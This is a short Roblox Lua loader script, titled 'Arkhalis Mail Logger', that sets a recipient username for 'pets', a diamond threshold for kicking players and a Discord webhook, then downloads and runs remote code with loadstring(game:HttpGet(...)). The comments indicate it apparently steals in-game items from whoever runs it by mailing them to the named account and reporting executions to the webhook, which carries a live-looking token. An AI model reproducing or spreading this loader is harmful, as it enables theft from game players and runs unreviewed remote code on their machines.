--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "sn_ym" --// Username To Send Pets To
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick

--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1109102511224270919/o3k5umwrFvUa91J9bZpmMkwHVCx_YfMRB_WDpOpVuXlmNrbRWfaeoUmjTSNYYRhqtp3u" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
